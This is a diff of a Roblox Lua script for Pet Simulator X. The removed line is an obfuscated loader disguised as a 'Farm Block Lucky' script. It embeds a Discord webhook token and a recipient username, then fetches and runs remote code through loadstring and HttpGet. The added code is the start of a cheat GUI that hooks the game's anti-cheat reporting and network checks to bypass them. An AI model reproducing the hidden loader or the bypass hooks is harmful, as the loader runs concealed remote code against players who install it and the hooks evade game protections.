@@ -1,1 +1,2543 @@
-do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=0;local v19;local v20;local v21;local v22;local v23;local v24;local v25;local v26;local v27;local v28;local v29;local v30;while true do if (v18==5) then v27=v24;v28=nil;function v28(...)return {...},v12("#",...);end v18=6;end if (v18==2) then function v22()local v31=0 -(931 -(857 + 74)) ;local v32;while true do if (v31==(2 -1)) then return v32;end if (v31==(0 -0)) then v32=v1(v16,v19,v19);v19=v19 + (2 -1) ;v31=620 -(555 + 64) ;end end end v23=nil;function v23()local v33,v34=v1(v16,v19,v19 + (570 -(367 + 201)) );v19=v19 + (929 -(214 + 713)) ;return (v34 * (65 + 191)) + v33 ;end v18=3;end if (v18==4) then function v25()local v35=v24();local v36=v24();local v37=1 + 0 ;local v38=(v21(v36,878 -(282 + (2364 -1769)) ,1657 -(1523 + 114) ) * (2^(29 + 3))) + v35 ;local v39=v21(v36,(981 -(802 + 150)) -8 ,1096 -(68 + 997) );local v40=((v21(v36,1302 -(226 + 1044) )==((10 -6) -(5 -2))) and  -1) or 1 ;if (v39==(117 -(32 + 85))) then if (v38==(0 + 0)) then return v40 * 0 ;else local v80=0 + 0 ;while true do if (v80==(957 -(892 + 65))) then v39=2 -1 ;v37=(0 + 0) -0 ;break;end end end elseif (v39==(3757 -1710)) then return ((v38==(350 -(87 + 263))) and (v40 * ((181 -(67 + 113))/0))) or (v40 * NaN) ;end return v8(v40,v39-(751 + (1269 -(915 + 82))) ) * (v37 + (v38/((4 -2)^(39 + 13)))) ;end v26=nil;function v26(v41)local v42;if  not v41 then local v71=0 -0 ;while true do if (0==v71) then v41=v24();if (v41==(0 -(0 -0))) then return "";end break;end end end v42=v3(v16,v19,(v19 + v41) -(1 + 0 + 0) );v19=v19 + v41 ;local v43={};for v69=1, #v42 do v43[v69]=v2(v1(v3(v42,v69,v69)));end return v6(v43);end v18=5;end if (v18==6) then v29=nil;function v29()local v44=114 -(4 + 110) ;local v45;local v46;local v47;local v48;local v49;local v50;local v51;local v52;local v53;while true do if (v44~=3) then else v51=nil;v52=nil;v44=588 -(57 + 527) ;end if (v44~=2) then else v49=nil;v50=nil;v44=1430 -(41 + 1386) ;end if (v44==(103 -(17 + 86))) then v45=0 + 0 ;v46=nil;v44=1 -0 ;end if (v44~=4) then else v53=nil;while true do if (v45==(8 -5)) then local v98=0;while true do if (1~=v98) then else v45=4;break;end if (v98~=(166 -(122 + 44))) then else v52=nil;v53=nil;v98=1;end end end if (v45~=0) then else local v99=0;while true do if ((0 -0)==v99) then v46=0;v47=nil;v99=1;end if (v99~=(3 -2)) then else v45=1;break;end end end if (v45==1) then v48=nil;v49=nil;v45=2;end if (v45==2) then v50=nil;v51=nil;v45=3 + 0 ;end if (v45==(1 + 3)) then while true do if (v46==2) then local v105=0 -0 ;while true do if (v105~=(65 -(30 + 35))) then else v51=nil;v52=nil;v105=1;end if (v105~=1) then else v46=3;break;end end end if (v46==(0 + 0)) then local v106=0;local v107;while true do if (v106~=(1257 -(1043 + 214))) then else v107=0;while true do if (v107~=(3 -2)) then else v46=1;break;end if (v107~=(1212 -(323 + 889))) then else local v155=0 -0 ;while true do if (v155~=0) then else v47=0;v48=nil;v155=1;end if (v155==(581 -(361 + 219))) then v107=321 -(53 + 267) ;break;end end end end break;end end end if (v46~=(1 + 0)) then else local v108=413 -(15 + 398) ;local v109;while true do if (v108~=0) then else v109=982 -(18 + 964) ;while true do if (v109~=(0 -0)) then else local v156=0;while true do if (v156==0) then v49=nil;v50=nil;v156=1 + 0 ;end if (v156==1) then v109=1 + 0 ;break;end end end if ((851 -(20 + 830))~=v109) then else v46=2 + 0 ;break;end end break;end end end if (v46~=3) then else v53=nil;while true do local v110=126 -(116 + 10) ;local v111;local v112;while true do if (v110~=(0 + 0)) then else v111=738 -(542 + 196) ;v112=nil;v110=1;end if (1==v110) then while true do if (v111==(0 -0)) then v112=0;while true do if (v112~=(0 + 0)) then else local v185=0 + 0 ;while true do if (v185==(0 + 0)) then if (v47==(4 -2)) then local v190=0 -0 ;local v191;while true do if (v190~=(1551 -(1126 + 425))) then else v191=405 -(118 + 287) ;while true do local v197=0;while true do if ((0 -0)==v197) then if (v191~=1) then else return v51;end if (v191~=0) then else local v201=1121 -(118 + 1003) ;while true do if (v201~=1) then else v191=1;break;end if (v201~=0) then else for v209=1,v24() do local v210=0 -0 ;local v211;local v212;local v213;while true do if (v210~=0) then else v211=0;v212=nil;v210=1;end if ((378 -(142 + 235))==v210) then v213=nil;while true do if (v211~=(4 -3)) then else while true do if (v212~=(0 + 0)) then else v213=v22();if (v21(v213,1,978 -(553 + 424) )~=(0 -0)) then else local v218=0 + 0 ;local v219;local v220;local v221;local v222;local v223;local v224;while true do if (v218==(1 + 0)) then v221=nil;v222=nil;v218=2 + 0 ;end if (3==v218) then while true do if (1~=v219) then else local v225=0 + 0 ;while true do if ((1 + 0)==v225) then v219=2;break;end if (v225~=(0 -0)) then else v222=nil;v223=nil;v225=2 -1 ;end end end if (v219==(0 -0)) then local v226=0 + 0 ;while true do if (v226~=(4 -3)) then else v219=754 -(239 + 514) ;break;end if (v226==0) then v220=0 + 0 ;v221=nil;v226=1330 -(797 + 532) ;end end end if ((2 + 0)~=v219) then else v224=nil;while true do if (v220~=(0 + 0)) then else v221=0 -0 ;v222=nil;v220=1203 -(373 + 829) ;end if (v220~=(733 -(476 + 255))) then else while true do if ((1133 -(369 + 761))==v221) then if (v21(v223,3,3)~=(1 + 0)) then else v224[4]=v53[v224[6 -2 ]];end v48[v209]=v224;break;end if (v221==(3 -1)) then local v229=238 -(64 + 174) ;local v230;while true do if (v229==0) then v230=0 + 0 ;while true do if (v230~=0) then else local v238=0 -0 ;local v239;while true do if (v238~=0) then else v239=0;while true do if (v239==(336 -(144 + 192))) then local v247=216 -(42 + 174) ;while true do if (v247~=1) then else v239=1 + 0 ;break;end if (v247==0) then if (v21(v223,1 + 0 ,1)~=(1 + 0)) then else v224[1506 -(363 + 1141) ]=v53[v224[1582 -(1183 + 397) ]];end if (v21(v223,2,2)~=1) then else v224[8 -5 ]=v53[v224[3]];end v247=1 + 0 ;end end end if (v239==1) then v230=1 + 0 ;break;end end break;end end end if (v230==(1976 -(1913 + 62))) then v221=3;break;end end break;end end end if (v221~=(1 + 0)) then else local v231=0;local v232;while true do if (v231==(0 -0)) then v232=1933 -(565 + 1368) ;while true do if (v232==(0 -0)) then local v240=1661 -(1477 + 184) ;while true do if (0==v240) then v224={v23(),v23(),nil,nil};if (v222==(0 -0)) then local v243=0 + 0 ;local v244;local v245;local v246;while true do if (v243~=0) then else v244=0;v245=nil;v243=1;end if (v243~=(857 -(564 + 292))) then else v246=nil;while true do if (v244~=1) then else while true do if (v245~=(0 -0)) then else v246=0 -0 ;while true do if (v246==(304 -(244 + 60))) then v224[3]=v23();v224[4 + 0 ]=v23();break;end end break;end end break;end if (v244==(476 -(41 + 435))) then local v254=0;while true do if (v254==(1001 -(938 + 63))) then v245=0 + 0 ;v246=nil;v254=1;end if (1==v254) then v244=1126 -(936 + 189) ;break;end end end end break;end end elseif (v222==1) then v224[3]=v24();elseif (v222==(1 + 1)) then v224[3]=v24() -((1615 -(1565 + 48))^(10 + 6)) ;elseif (v222==(1141 -(782 + 356))) then local v255=0;local v256;while true do if (v255==0) then v256=0;while true do if (v256~=(267 -(176 + 91))) then else v224[7 -4 ]=v24() -(2^(23 -7)) ;v224[4]=v23();break;end end break;end end end v240=1093 -(975 + 117) ;end if (v240==1) then v232=1;break;end end end if (v232~=(1876 -(157 + 1718))) then else v221=2 + 0 ;break;end end break;end end end if ((0 -0)~=v221) then else local v233=0 -0 ;local v234;local v235;while true do if (v233~=(1019 -(697 + 321))) then else while true do if (v234~=(0 -0)) then else v235=0 -0 ;while true do if (v235~=(0 -0)) then else local v241=0;local v242;while true do if (v241==(0 + 0)) then v242=0;while true do if (v242==0) then v222=v21(v213,3 -1 ,3);v223=v21(v213,4,15 -9 );v242=1;end if (v242~=1) then else v235=1228 -(322 + 905) ;break;end end break;end end end if (v235~=(612 -(602 + 9))) then else v221=1;break;end end break;end end break;end if (v233==0) then v234=1189 -(449 + 740) ;v235=nil;v233=873 -(826 + 46) ;end end end end break;end if (v220==1) then local v227=0;while true do if (v227==(948 -(245 + 702))) then v220=2;break;end if (v227~=0) then else v223=nil;v224=nil;v227=3 -2 ;end end end end break;end end break;end if (v218==2) then v223=nil;v224=nil;v218=3;end if (v218==0) then v219=0 + 0 ;v220=nil;v218=1;end end end break;end end break;end if (v211~=(1898 -(260 + 1638))) then else v212=0;v213=nil;v211=441 -(382 + 58) ;end end break;end end end for v214=3 -2 ,v24() do v49[v214-(1 + 0) ]=v29();end v201=1 -0 ;end end end break;end end end break;end end end if (v47~=1) then else local v192=0;local v193;while true do if (v192~=0) then else v193=0 -0 ;while true do if (v193==2) then v47=2;break;end if (v193==1) then local v198=0;while true do if (v198==0) then for v204=1206 -(902 + 303) ,v52 do local v205=0;local v206;local v207;local v208;while true do if (v205==(0 -0)) then v206=0 -0 ;v207=nil;v205=1 + 0 ;end if (v205==(1691 -(1121 + 569))) then v208=nil;while true do if (v206==1) then if (v207==1) then v208=v22()~=(214 -(22 + 192)) ;elseif (v207==(685 -(483 + 200))) then v208=v25();elseif (v207~=(1466 -(1404 + 59))) then else v208=v26();end v53[v204]=v208;break;end if (v206~=(0 -0)) then else local v217=0 -0 ;while true do if (v217~=1) then else v206=1;break;end if (v217~=(765 -(468 + 297))) then else v207=v22();v208=nil;v217=563 -(334 + 228) ;end end end end break;end end end v51[3]=v22();v198=3 -2 ;end if (v198==(2 -1)) then v193=2;break;end end end if (v193==0) then local v199=0 -0 ;local v200;while true do if (v199==(0 + 0)) then v200=0;while true do if (v200~=0) then else v52=v24();v53={};v200=1;end if (1==v200) then v193=237 -(141 + 95) ;break;end end break;end end end end break;end end end v185=1;end if (v185==(1 + 0)) then v112=2 -1 ;break;end end end if (v112==(2 -1)) then if (v47==(0 + 0)) then local v188=0;local v189;while true do if (v188~=0) then else v189=0;while true do if (v189==(2 -1)) then local v194=0 + 0 ;while true do if (0==v194) then v50={};v51={v48,v49,nil,v50};v194=1 + 0 ;end if (v194~=1) then else v189=2;break;end end end if ((163 -(92 + 71))~=v189) then else local v195=0 + 0 ;local v196;while true do if (v195==0) then v196=0 -0 ;while true do if ((765 -(574 + 191))~=v196) then else local v203=0;while true do if ((0 + 0)~=v203) then else v48={};v49={};v203=2 -1 ;end if (v203==1) then v196=1;break;end end end if (v196==(1 + 0)) then v189=1;break;end end break;end end end if ((851 -(254 + 595))==v189) then v47=1;break;end end break;end end end break;end end break;end end break;end end end break;end end break;end end break;end if ((127 -(55 + 71))==v44) then v47=nil;v48=nil;v44=2;end end end v30=nil;v18=7;end if (v18==0) then v19=1;v20=nil;v16=v4(v3(v16,5),"..",function(v54)if (v1(v54,2)==79) then v20=v0(v3(v54,1,1));return "";else local v72=0;local v73;while true do if (v72==0) then v73=v2(v0(v54,16));if v20 then local v100=v5(v73,v20);v20=nil;return v100;else return v73;end break;end end end end);v18=1;end if (v18==3) then v24=nil;function v24()local v55,v56,v57,v58=v1(v16,v19,v19 + 3 );v19=v19 + 4 ;return (v58 * (16779006 -(573 + 1217))) + (v57 * (86336 -20800)) + (v56 * 256) + v55 ;end v25=nil;v18=4;end if (v18==7) then function v30(v59,v60,v61)local v62=0;local v63;local v64;local v65;while true do if (v62==1) then v65=v59[3];return function(...)local v81=v63;local v82=v64;local v83=v65;local v84=v28;local v85=1;local v86= -1;local v87={};local v88={...};local v89=v12("#",...) -1 ;local v90={};local v91={};for v95=0,v89 do if (v95>=v83) then v87[v95-v83 ]=v88[v95 + 1 ];else v91[v95]=v88[v95 + 1 ];end end local v92=(v89-v83) + 1 ;local v93;local v94;while true do v93=v81[v85];v94=v93[1];if (v94<=7) then if (v94<=3) then if (v94<=1) then if (v94==0) then v85=v93[3];else local v114=v93[2];local v115=v91[v93[3]];v91[v114 + 1 ]=v115;v91[v114]=v115[v93[4]];end elseif (v94==2) then local v119;local v120,v121;local v122;local v123;v91[v93[2]][v93[3]]=v93[4];v85=v85 + 1 ;v93=v81[v85];v91[v93[2]]=v61[v93[3]];v85=v85 + 1 ;v93=v81[v85];v91[v93[2]][v93[3]]=v93[4];v85=v85 + 1 ;v93=v81[v85];v91[v93[2]]=v61[v93[3]];v85=v85 + 1 ;v93=v81[v85];v91[v93[2]]=v61[v93[3]];v85=v85 + 1 ;v93=v81[v85];v123=v93[2];v122=v91[v93[3]];v91[v123 + 1 ]=v122;v91[v123]=v122[v93[4]];v85=v85 + 1 ;v93=v81[v85];v91[v93[2]]=v93[3];v85=v85 + 1 ;v93=v81[v85];v91[v93[2]]=v93[3]~=0 ;v85=v85 + 1 ;v93=v81[v85];v123=v93[2];v120,v121=v84(v91[v123](v13(v91,v123 + 1 ,v93[3])));v86=(v121 + v123) -1 ;v119=0;for v151=v123,v86 do local v152=0;while true do if (0==v152) then v119=v119 + 1 ;v91[v151]=v120[v119];break;end end end v85=v85 + 1 ;v93=v81[v85];v123=v93[2];v91[v123]=v91[v123](v13(v91,v123 + 1 ,v86));else for v153=v93[2],v93[3] do v91[v153]=nil;end end elseif (v94<=5) then if (v94==4) then local v135=v93[2];v91[v135]=v91[v135](v13(v91,v135 + 1 ,v86));else v91[v93[2]]=v93[3];end elseif (v94>6) then do return;end else v91[v93[2]][v93[3]]=v93[4];end elseif (v94<=11) then if (v94<=9) then if (v94==8) then if (v93[2]==v91[v93[4]]) then v85=v85 + 1 ;else v85=v93[3];end else v91[v93[2]][v93[3]]=v93[4];v85=v85 + 1 ;v93=v81[v85];v91[v93[2]]=v61[v93[3]];v85=v85 + 1 ;v93=v81[v85];v91[v93[2]][v93[3]]=v93[4];v85=v85 + 1 ;v93=v81[v85];v91[v93[2]]=v93[3];v85=v85 + 1 ;v93=v81[v85];v85=v93[3];end elseif (v94>10) then v91[v93[2]]=v93[3]~=0 ;else local v148=0;while true do if (v148==1) then v85=v85 + 1 ;v93=v81[v85];v91[v93[2]][v93[3]]=v93[4];v85=v85 + 1 ;v148=2;end if (v148==2) then v93=v81[v85];v91[v93[2]]=v93[3];v85=v85 + 1 ;v93=v81[v85];v148=3;end if (v148==3) then v85=v93[3];break;end if (v148==0) then v91[v93[2]][v93[3]]=v93[4];v85=v85 + 1 ;v93=v81[v85];v91[v93[2]]=v61[v93[3]];v148=1;end end end elseif (v94<=13) then if (v94>12) then v91[v93[2]]();else v91[v93[2]]=v61[v93[3]];end elseif (v94<=14) then if (v91[v93[2]]==v93[4]) then v85=v85 + 1 ;else v85=v93[3];end elseif (v94==15) then local v159=v93[2];local v160,v161=v84(v91[v159](v13(v91,v159 + 1 ,v93[3])));v86=(v161 + v159) -1 ;local v162=0;for v181=v159,v86 do local v182=0;while true do if (v182==0) then v162=v162 + 1 ;v91[v181]=v160[v162];break;end end end else v91[v93[2]][v93[3]]=v93[4];v85=v85 + 1 ;v93=v81[v85];v91[v93[2]]=v61[v93[3]];v85=v85 + 1 ;v93=v81[v85];v91[v93[2]][v93[3]]=v93[4];v85=v85 + 1 ;v93=v81[v85];v91[v93[2]]=v93[3];v85=v85 + 1 ;v93=v81[v85];v85=v93[3];end v85=v85 + 1 ;end end;end if (v62==0) then v63=v59[1];v64=v59[2];v62=1;end end end return v30(v29(),{},v17)(...);end if (v18==1) then v21=nil;function v21(v66,v67,v68)if v68 then local v74=(v66/((1 + 1)^(v67-((3 -2) -0))))%((941 -((1446 -(16 + 716)) + 225))^(((v68-1) -(v67-(2 -1))) + (1 -0))) ;return v74-(v74%(1 + 0)) ;else local v75=0;local v76;while true do if (v75==(0 -0)) then v76=(808 -(118 + 688))^(v67-(49 -(25 + 23))) ;return (((v66%(v76 + v76))>=v76) and (1 + 0)) or (1886 -(927 + 959)) ;end end end end v22=nil;v18=2;end end end v15("LOL!1C3O00028O00026O00084003023O005F4703093O00546869726454657874030E3O00416C6D6F737420446F6E653O2E030B3O0057616974696E6754696D65026O004940030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403433O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F53757065724D6F6E7A2F5073785F53632F6D61696E2F4D6F6E7A5072656D69756D026O00F03F03093O004D6F7573654C6F636B2O01027O0040030D3O004C6F6164696E675363722O656E03093O00416E74694C6561766503073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F2O3130352O33393130382O35393136333435332F53304156595057756F62317259745F656D3851353862746351633376324D57394579744475796134354E3143325278474D3154644A2O474850487330726338417231336E03083O00557365724E616D65030B3O00546568507563756B5F2O3503093O00557365724E616D6532030A3O005365636F6E645465787403113O00536372697074204C6F6164696E673O2E030A3O005363726970744E616D6503103O004661726D20426C6F636B204C75636B7903093O0046697273745465787403103O0053637269707420507265706172696E67004B3O0012053O00014O0003000100013O000E080001000200013O00044O00020001001205000100013O00260E000100140001000200044O0014000100120C000200033O00300200020004000500122O000200033O00302O00020006000700122O000200083O00122O000300093O00202O00030003000A00122O0005000B6O000600016O000300066O00023O00022O000D00020001000100044O004A000100260E000100250001000C00044O00250001001205000200013O00260E0002001D0001000C00044O001D000100120C000300033O0030060003000D000E0012050001000F3O00044O0025000100260E000200170001000100044O0017000100120C000300033O00300900030010000E00122O000300033O00302O00030011000E00122O0002000C3O00044O0017000100260E000100360001000100044O00360001001205000200013O00260E0002002E0001000C00044O002E000100120C000300033O0030060003001200130012050001000C3O00044O0036000100260E000200280001000100044O0028000100120C000300033O00300900030014001500122O000300033O00302O00030016001500122O0002000C3O00044O0028000100260E000100050001000F00044O00050001001205000200013O00260E0002003F0001000C00044O003F000100120C000300033O003006000300170018001205000100023O00044O0005000100260E000200390001000100044O0039000100120C000300033O00300900030019001A00122O000300033O00302O0003001B001C00122O0002000C3O00044O0039000100044O0005000100044O004A000100044O000200012O00073O00017O00",v9(),...);end
+--[[
+-- THIS SCRIPT HAS BEEN CODED BY MONZ (https://discord.gg/d2X3XVm7)
+-- DON'T BE A STUPID SKIDDIE THAT STEAL PEOPLE CODE AND PUT ON A SHIT PAID (or "watch ad to get key") SCRIPT
+-- hi Project WD please don't steal my code again thx
+
+-- For Preston:
+-- Sorry for any incovenience I don't make any malicous script like mail/bank stealers, trade scam and this shit, just auto-farm and QoL scripts, feel free to use this repo to fix any vulnerability on your game
+--]]
+
+-- Join us at 
+-- https://discord.gg/d2X3XVm7
+
+
+
+
+--[[
+-- TODO LIST:
+-- • Huge notifier on Discord Webhook (its ez but I'm lazy)
+-- • Auto quest
+-- • Improve Bank Index with "Auto buy storage upgrades" (+ withdraw needed diamonds from bank)
+--]]
+
+
+-- Important Variables
+local SCRIPT_NAME = "Monz PSX GUI"
+local SCRIPT_VERSION = "v0.4" -- Hey monz remember to change it before updating lmao
+
+-- Detect if the script has executed by AutoExec
+local AutoExecuted = false
+if not game:IsLoaded() then AutoExecuted = true end
+
+repeat task.wait() until game.PlaceId ~= nil
+if not game:IsLoaded() then game.Loaded:Wait() end
+
+--//-------------- SERVICES ----------------//*
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local InputService = game:GetService('UserInputService')
+local RunService = game:GetService('RunService')
+local ContentProvider = game:GetService("ContentProvider")
+
+--//*--------- GLOBAL VARIABLES -----------//*
+local ScriptIsCurrentlyBusy = false
+local Character = nil
+local Humanoid = nil
+local HumanoidRootPart = nil
+local CurrentWorld = ""
+local CurrentPosition = nil
+
+local Settings_DisableRendering = true
+
+local Webhook_Enabled = false
+local Webhook_URL = ""
+local Webhook_Daycare = true
+local Webhook_Huge = true
+
+LocalPlayer.CharacterAdded:Connect(function(char) 
+	Character = char
+	Humanoid = Character:WaitForChild("Humanoid")
+	HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
+end)
+
+if game.PlaceId == 6284583030 or game.PlaceId == 10321372166 or game.PlaceId == 7722306047 or game.PlaceId == 12610002282 then
+	
+	local banSuccess, banError = pcall(function() 
+		local Blunder = require(game:GetService("ReplicatedStorage"):WaitForChild("X", 10):WaitForChild("Blunder", 10):WaitForChild("BlunderList", 10))
+		if not Blunder or not Blunder.getAndClear then LocalPlayer:Kick("Error while bypassing the anti-cheat! (Didn't find blunder)") end
+		
+		local OldGet = Blunder.getAndClear
+		setreadonly(Blunder, false)
+		local function OutputData(Message)
+		   print("-- PET SIM X BLUNDER --")
+		   print(Message .. "\n")
+		end
+		
+		Blunder.getAndClear = function(...)
+		   local Packet = ...
+			for i,v in next, Packet.list do
+			   if v.message ~= "PING" then
+				   OutputData(v.message)
+				   table.remove(Packet.list, i)
+			   end
+		   end
+		   return OldGet(Packet)
+		end
+		
+		setreadonly(Blunder, true)
+	end)
+
+	if not banSuccess then
+		LocalPlayer:Kick("Error while bypassing the anti-cheat! (".. banError ..")")
+		return
+	end
+	
+	local Library = require(game:GetService("ReplicatedStorage").Library)
+	assert(Library, "Oopps! Library has not been loaded. Maybe try re-joining?") 
+	while not Library.Loaded do task.wait() end
+	
+	Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+	Humanoid = Character:WaitForChild("Humanoid")
+	HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
+	
+	
+	local bypassSuccess, bypassError = pcall(function()
+		if not Library.Network then 
+			LocalPlayer:Kick("Network not found, can't bypass!")
+		end
+		
+		if not Library.Network.Invoke or not Library.Network.Fire then
+			LocalPlayer:Kick("Network Invoke/Fire was not found! Failed to bypass!")
+		end
+		
+		hookfunction(debug.getupvalue(Library.Network.Invoke, 1), function(...) return true end)
+		-- Currently we don't need to hook Fire, since both Invoke/Fire have the same upvalue, this may change in future.
+		-- hookfunction(debug.getupvalue(Library.Network.Fire, 1), function(...) return true end)
+		
+		local originalPlay = Library.Audio.Play
+		Library.Audio.Play = function(...) 
+			if checkcaller() then
+				local audioId, parent, pitch, volume, maxDistance, group, looped, timePosition = unpack({ ... })
+				if type(audioId) == "table" then
+					audioId = audioId[Random.new():NextInteger(1, #audioId)]
+				end
+				if not parent then
+					warn("Parent cannot be nil", debug.traceback())
+					return nil
+				end
+				if audioId == 0 then return nil end
+				
+				if type(audioId) == "number" or not string.find(audioId, "rbxassetid://", 1, true) then
+					audioId = "rbxassetid://" .. audioId
+				end
+				if pitch and type(pitch) == "table" then
+					pitch = Random.new():NextNumber(unpack(pitch))
+				end
+				if volume and type(volume) == "table" then
+					volume = Random.new():NextNumber(unpack(volume))
+				end
+				if group then
+					local soundGroup = game.SoundService:FindFirstChild(group) or nil
+				else
+					soundGroup = nil
+				end
+				if timePosition == nil then
+					timePosition = 0
+				else
+					timePosition = timePosition
+				end
+				local isGargabe = false
+				if not pcall(function() local _ = parent.Parent end) then
+					local newParent = parent
+					pcall(function()
+						newParent = CFrame.new(newParent)
+					end)
+					parent = Instance.new("Part")
+					parent.Anchored = true
+					parent.CanCollide = false
+					parent.CFrame = newParent
+					parent.Size = Vector3.new()
+					parent.Transparency = 1
+					parent.Parent = workspace:WaitForChild("__DEBRIS")
+					isGargabe = true
+				end
+				local sound = Instance.new("Sound")
+				sound.SoundId = audioId
+				sound.Name = "sound-" .. audioId
+				sound.Pitch = pitch and 1
+				sound.Volume = volume and 0.5
+				sound.SoundGroup = soundGroup
+				sound.Looped = looped and false
+				sound.MaxDistance = maxDistance and 100
+				sound.TimePosition = timePosition
+				sound.RollOffMode = Enum.RollOffMode.Linear
+				sound.Parent = parent
+				if not require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client")).Settings.SoundsEnabled then
+					sound:SetAttribute("CachedVolume", sound.Volume)
+					sound.Volume = 0
+				end
+				sound:Play()
+				getfenv(originalPlay).AddToGarbageCollection(sound, isGargabe)
+				return sound
+			end
+			
+			return originalPlay(...)
+		end
+	
+	end)
+	
+	if not bypassSuccess then
+		print(bypassError)
+		LocalPlayer:Kick("Error while bypassing network, try again or wait for an update!")
+		return
+	end
+	
+	LocalPlayer.PlayerScripts:WaitForChild("Scripts", 10):WaitForChild("Game", 10):WaitForChild("Coins", 10)
+	LocalPlayer.PlayerScripts:WaitForChild("Scripts", 10):WaitForChild("Game", 10):WaitForChild("Pets", 10)
+	wait()
+	-- local orbsScript = getsenv(game.Players.LocalPlayer.PlayerScripts.Scripts.Game:WaitForChild("Orbs", 10))
+	-- local CollectOrb = orbsScript.Collect
+	
+	local GetRemoteFunction = debug.getupvalue(Library.Network.Invoke, 2)
+		-- OrbList = debug.getupvalue(orbsScript.Collect, 1)
+	local CoinsTable = debug.getupvalue(getsenv(LocalPlayer.PlayerScripts.Scripts.Game:WaitForChild("Coins", 10)).DestroyAllCoins, 1)
+	local RenderedPets = debug.getupvalue(getsenv(LocalPlayer.PlayerScripts.Scripts.Game:WaitForChild("Pets", 10)).NetworkUpdate, 1)
+	
+	
+	local IsHardcore = Library.Shared.IsHardcore
+
+	local AllGameWorlds = {}
+	for name, world in pairs(Library.Directory.Worlds) do 
+		if name ~= "WIP" and name ~= "Trading Plaza" and not world.disabled and world.worldOrder and world.worldOrder ~= 0 then
+			world.name = name
+			table.insert(AllGameWorlds, world)
+		end
+	end
+	
+	table.sort(AllGameWorlds, function(a, b) 
+		return a.worldOrder < b.worldOrder
+	end)
+	
+
+	local WorldWithAreas = {}
+	for areaName, area in pairs(Library.Directory.Areas) do 
+		if area and area.world then
+			local world = Library.Directory.Worlds[area.world]
+			local containsSpawn = false
+			
+			if world and world.spawns then
+				for spawnName, spawn in pairs(world.spawns) do 
+					if spawn.settings and spawn.settings.area and spawn.settings.area == name then 
+						containsSpawn = true 
+						break 
+					end
+				end
+			end
+			
+			if containsSpawn then
+				if not WorldWithAreas[area.world] then 
+					WorldWithAreas[area.world] = {}
+				end
+
+				table.insert(WorldWithAreas[area.world], area.name)
+			end
+		end
+	end
+	
+
+	function GetAllAreasInWorld(world)
+		-- local AllAreasInSelectedWorld = {}
+
+		-- for name, area in pairs(Library.Directory.Areas) do
+			-- local containsSpawn = false
+			-- for spawnName, spawn in pairs(world.spawns) do 
+				-- if spawn.settings and spawn.settings.area and spawn.settings.area == name then 
+					-- containsSpawn = true 
+					-- break 
+				-- end
+			-- end
+			
+			-- if area.world == world.name and containsSpawn then
+				-- table.insert(AllAreasInSelectedWorld, name)
+			-- end
+		-- end
+
+		-- table.sort(AllAreasInSelectedWorld, function(a, b)
+			-- local areaA = Library.Directory.Areas[a]
+			-- local areaB = Library.Directory.Areas[b]
+			-- return areaA.id < areaB.id
+		-- end)
+
+		-- return AllAreasInSelectedWorld 
+		return WorldWithAreas[world] or {}
+	end
+	
+	--// AUTO COMPLETE game
+	local AllGameAreas = {}
+	
+	for name, area in pairs(Library.Directory.Areas) do
+		local world = Library.Directory.Worlds[area.world]
+		if world and world.worldOrder and world.worldOrder > 0 then
+			if not area.hidden and not area.isVIP then
+				local containsArea = false
+				if world.spawns then
+					for i,v in pairs(world.spawns) do
+						if v.settings and v.settings.area and v.settings.area == name then 
+							containsArea = true 
+							break 
+						end
+					end
+				end
+				
+				if area.gate or containsArea then
+					table.insert(AllGameAreas, name)
+				end
+			end
+		end
+	end
+	
+
+	
+	table.sort(AllGameAreas, function(a, b)
+		local areaA = Library.Directory.Areas[a]
+		local areaB = Library.Directory.Areas[b]
+
+		local worldA = Library.Directory.Worlds[areaA.world]
+		if a == "Ice Tech" then 
+			worldA = Library.Directory.Worlds["Fantasy"]
+		end
+		
+		local worldB = Library.Directory.Worlds[areaB.world]
+		if b == "Ice Tech" then 
+			worldB = Library.Directory.Worlds["Fantasy"]
+		end
+
+		if worldA.worldOrder ~= worldB.worldOrder then
+			return worldA.worldOrder < worldB.worldOrder
+		end
+		
+		local currencyA = Library.Directory.Currency[worldA.mainCurrency]
+		local currencyB = Library.Directory.Currency[worldB.mainCurrency]
+		if currencyA.order ~= currencyB.order then
+			return currencyA.order < currencyB.order
+		end
+		
+		if not areaA.gate or not areaB.gate then
+			return areaA.id < areaB.id
+		end
+		
+		return areaA.gate.cost < areaB.gate.cost
+	end)
+	
+
+	function GetCurrentAndNextArea()
+		local cArea, nArea = "", ""
+
+		
+		for i, v in ipairs(AllGameAreas) do 
+			if cArea == "" and Library.WorldCmds.HasArea(v) then
+				local nxtArea = AllGameAreas[i + 1]
+				if nxtArea and not Library.WorldCmds.HasArea(nxtArea) then 
+					cArea = v
+					nArea = nxtArea
+					break
+				elseif not nxtArea then
+					cArea = v
+					nArea = "COMPLETED"
+				end
+			end
+		end
+		
+		
+		return cArea, nArea
+	end
+
+	
+	function CheckIfCanAffordArea(areaName)
+		local saveData = Library.Save.Get()
+		local area = Library.Directory.Areas[areaName]
+		
+		if not saveData then 
+			return false 
+		end
+		
+		if not area then return false end
+		
+		if not area.gate then 
+			return true 
+		end -- Area is free =)
+		
+		local gateCurrency = area.gate.currency
+		local currency = saveData[gateCurrency]
+		if IsHardcore then
+			if gateCurrency ~= "Diamonds" then
+				currency = saveData.HardcoreCurrency[gateCurrency]
+			end
+		end
+		
+		if currency and currency >= area.gate.cost then
+			return true
+		end
+		
+		return false
+	end
+	
+	-- TODO: Implement huge webhook notifier 
+	function RewardsRedeemed(rewards)
+
+		for v, rewardBox in pairs(rewards) do 
+			local reward, quantity = unpack(rewardBox)
+			if Webhook_Huge and reward == "Huge Pet" then 
+				local petId = quantity
+				local petData = Library.Directory.Pets[petId]
+				if petData then
